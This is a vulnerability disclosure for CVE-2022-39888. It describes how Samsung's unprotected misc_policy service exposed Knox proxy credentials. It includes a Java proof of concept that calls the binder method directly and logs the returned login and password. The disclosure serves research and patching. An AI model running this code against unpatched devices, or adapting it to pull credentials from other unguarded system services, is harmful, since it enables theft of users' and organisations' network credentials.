# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.07.30</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.11.08</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39888">CVE-2022-39888</a> (SVE-2022-1810)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$440</td>
    </tr>
</table>

# Description

The system service `misc_policy` (`com.samsung.android.knox.IMiscPolicy`) contained a method `retrieveExternalProxy()` which was not protected in any way. It returned a `com.samsung.android.knox.net.ProxyProperties` object, which contained not only basic proxy settings but also credentials such as login and password.

**Proof of Concept**

```java
static final int TRANSACTION_retrieveExternalProxy = 30;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("misc_policy");

        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

        Parcel reply = Parcel.obtain();

        binder.transact(TRANSACTION_retrieveExternalProxy, parcel, reply, 0);
        reply.readException();
        if (reply.readBoolean()) {
            Parcelable.Creator creator = (Parcelable.Creator) Class.forName("com.samsung.android.knox.net.ProxyProperties")
                    .getField("CREATOR")
                    .get(null);
            Object proxyObj = creator.createFromParcel(reply);
            Log.d("evil", "Result: " + new Gson().toJson(proxyObj));
        } else {
            Log.d("evil", "Result: null");
        }
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
